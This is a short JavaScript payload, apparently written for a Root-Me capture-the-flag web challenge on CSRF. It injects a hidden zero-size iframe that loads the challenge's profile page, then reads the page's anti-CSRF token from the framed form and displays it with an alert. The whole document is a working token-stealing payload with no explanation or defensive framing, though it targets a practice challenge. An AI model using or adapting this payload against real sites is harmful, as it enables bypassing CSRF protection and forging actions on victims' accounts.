alert("test CSRF");
document.writeln('<iframe id="iframe" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
function read()
{
    alert("test iframe");
    alert(document.getElementById("iframe").contentDocument.getElementById("profile").token.value);
}